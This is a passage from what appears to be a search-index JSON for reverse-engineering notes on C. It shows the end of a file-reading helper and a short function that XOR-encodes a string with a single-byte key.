fclose(pFile);\n        exit(0);\n    }\n    fclose(pFile);\n    return szReadBuffer;\n}\n</code></pre>"},{"location":"RE/langs/C/#_40","title":"\u5f02\u6216\u52a0\u5bc6\u5b57\u7b26\u4e32","text":"<pre><code>void xorcode(char * szBuffer, int nSize, char cKey)\n{\n    for (size_t i = 0; i &lt; nSize; i++)\n    {\n        szBuffer[i] ^= cKey;\n    }\n}\n</code></pre>"}]}